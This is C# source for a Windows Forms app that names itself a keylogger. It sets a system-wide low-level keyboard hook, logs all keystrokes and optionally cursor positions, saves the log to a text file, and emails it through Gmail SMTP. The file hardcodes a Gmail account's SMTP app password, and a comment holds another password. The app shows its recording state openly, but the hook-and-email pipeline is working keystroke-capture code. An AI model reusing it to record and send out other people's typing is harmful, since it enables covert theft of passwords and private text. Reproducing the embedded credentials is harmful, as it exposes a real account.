using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices.ComTypes;
using System.Net.Mail;
using System.Net;
using System.Globalization;
using System.Threading;
using static System.Windows.Forms.AxHost;
using FontAwesome.Sharp;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn // Create rounded corners
        (
                int nLeftRect,     // x-coordinate of upper-left corner
                int nTopRect,      // y-coordinate of upper-left corner
                int nRightRect,    // x-coordinate of lower-right corner
                int nBottomRect,   // y-coordinate of lower-right corner
                int nWidthEllipse, // height of ellipse
                int nHeightEllipse // width of ellipse
        );
        public Form1()
        {
            InitializeComponent();
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 20, 20)); // Apply rounded corners
            timePanel.Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, timePanel.Width, timePanel.Height, 20, 20)); // Apply rounded corners
            speedPanel.Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, speedPanel.Width, speedPanel.Height, 20, 20)); // Apply rounded corners
            textPanel.Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, textPanel.Width, textPanel.Height, 20, 20)); // Apply rounded corners
            header.Paint += new PaintEventHandler(header_Paint); // Gradient function call
            header.Refresh(); // Header refreshing after gradient function

        }
        // Gradient painting function
        private void header_Paint(object sender, PaintEventArgs e)
        {
            Point startPoint = new Point(0, 0);
            Point endPoint = new Point(header.Width, header.Height);

            LinearGradientBrush lgb = new LinearGradientBrush(startPoint, endPoint, Color.FromArgb(255, 67, 206, 162), Color.FromArgb(255, 24, 90, 157));
            Graphics g = e.Graphics;
            g.FillRectangle(lgb, 0, 0, header.Width, header.Height);
        }
        // Drag & drop for custom panel
        bool mouseDown;
        private Point offset;
        public void mouseDown_Event(object sender, MouseEventArgs e)
        {
            offset.X = e.X;
            offset.Y = e.Y;
            mouseDown = true;
        }
        private void mouseMove_Event(object sender, MouseEventArgs e)
        {
            if (mouseDown == true)
            {
                Point currentScreenPos = PointToScreen(e.Location);
                Location = new Point(currentScreenPos.X - offset.X, currentScreenPos.Y - offset.Y);
            }
        }
        private void mouseUp_Event(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }
        // Custom close & minimize buttons
        private void btnMinimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        // Main functional
        bool isStarted = false;

        // Start & pause
        private void btnControll_Click(object sender, EventArgs e)
        {
            if (isStarted)
            {
                btnControll.Text = "START";
                isStarted = false;
                workTimer.Stop();
                UnhookWindowsHookEx(hook);
                notificationLabel.Text = "Paused";
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#dbd640");
            }
            else
            {
                btnControll.Text = "PAUSE";
                isStarted = true;
                workTimer.Start();
                hook = SetHook(llkProcedure);
                notificationLabel.Text = "Recording";
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#40dbb7");
            }
        }
        // Save file
        private void btnSave_Click(object sender, EventArgs e)
        {
            isStarted = true;
            btnControll_Click(sender, e);

            if (buf == "")
            {
                notificationLabel.Text = "Can`t save nothing!";
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#db4040");
                return;
            }
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            sfd.Title = "Save key list";
            sfd.CheckPathExists = true;
            sfd.DefaultExt = "txt";
            sfd.Filter = "Text files (*.txt)|*.txt";
            sfd.FilterIndex = 2;
            sfd.RestoreDirectory = true;

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                if (Path.GetExtension(sfd.FileName).ToLower() != ".txt")
                {
                    MessageBox.Show("Please omit the extension or use '.txt'");
                    return;
                }

                File.WriteAllText(sfd.FileName, "Keys:\n" + buf + "\nMouse:\n" + cursor_buf + "\nWork time: " + timer.Text);

                notificationLabel.Text = Path.GetFileName(sfd.FileName) + " has been saved";
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#40dbb7");
            }
        }
        // E-mail send
        private void btnSend_Click(object sender, EventArgs e)
        {
            isStarted = true;
            btnControll_Click(sender, e);

            if (buf == "")
            {
                notificationLabel.Text = "Can`t send nothing!";
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#db4040");
                return;
            }

            try
            {
                // jjkkllipipip9098 - password
                // отправитель - устанавливаем адрес и отображаемое в письме имя
                MailAddress from = new MailAddress("aucuo.keylogger@gmail.com", "Keylogger");
                // кому отправляем
                MailAddress to = new MailAddress(emailInput.Text);
                // создаем объект сообщения
                MailMessage m = new MailMessage(from, to);
                // тема письма
                m.Subject = "Your keylog result";
                // текст письма
                m.Body = "<h2>Keys:</h2>" + buf + "<h2>Mouse:</h2>" + cursor_buf + "<h2>Work time:</h2>" + timer.Text;
                // письмо представляет код html
                m.IsBodyHtml = true;
                // адрес smtp-сервера и порт, с которого будем отправлять письмо
                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                smtp.EnableSsl = true;
                // логин и пароль
                smtp.Credentials = new NetworkCredential("aucuo.keylogger@gmail.com", "jyblraxjugpymvnb");
                smtp.EnableSsl = true;
                smtp.Send(m);
                notificationLabel.Text = "Email Sent";
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#40dbb7");
            }
            catch (Exception ex)
            {
                notificationLabel.Text = ex.Message;
                notificationLabel.ForeColor = ColorTranslator.FromHtml("#db4040");
            }
        }
        // Clear record
        private void btnClear_Click(object sender, EventArgs e)
        {
            if (workTimerTick == 0)
            {
                return;
            }

            buf = "";
            cursor_buf = "";
            keyList.Text = "";
            workTimerTick = 0;
            timer.Text = "00:00:00";
            typingSpeed.Text = "0 c/m";
            notificationLabel.Text = "Record was cleared";
            notificationLabel.ForeColor = ColorTranslator.FromHtml("#dbd640");
            isStarted = false;
            btnControll.Text = "START";
            workTimer.Stop();
            UnhookWindowsHookEx(hook);
        }

        // Work timer + reading to keyList + typing speed
        int workTimerTick = 0;
        TimeSpan workTimerTime;
        private void workTimer_Tick(object sender, EventArgs e)
        {
            workTimerTick += 10;
            workTimerTime = TimeSpan.FromMilliseconds(workTimerTick);

            timer.Text = workTimerTime.ToString(@"hh\:mm\:ss");

            if (buf.Length > 150)
            {
                keyList.Text = buf.Substring(buf.Length - 150);
            }
            else
            {
                keyList.Text = buf;
            }


            if (workTimerTick % 1000 == 0)
            {
                typingSpeed.Text = (clicks*60).ToString() + " c/m";
                clicks = 0;
            }

            if (trackCursorCheck.Checked & workTimerTick % 100 == 0)
            {
                cursor_buf += Cursor.Position.ToString();
            }
        }

        // Hooks (recording)
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        public static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static int clicks = 0;
        private static string buf = "";
        private static string cursor_buf = "";
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            var caps = Console.CapsLock;
            bool isBig = caps;

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                clicks++;
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    buf += ".";
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    buf += "1";
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    buf += "2";
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    buf += "3";
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    buf += "4";
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    buf += "5";
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    buf += "6";
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    buf += "7";
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    buf += "8";
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    buf += "9";
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    buf += "0";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    buf += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    buf += " ";
                }
                else
                {
                    if (!isBig && ((Keys)vkCode).ToString().Length == 1)
                    {
                        buf += char.ToLower(Convert.ToChar((Keys)vkCode));
                    }
                    else
                    {
                        buf += (Keys)vkCode;
                    }
                }

                
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }
        
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}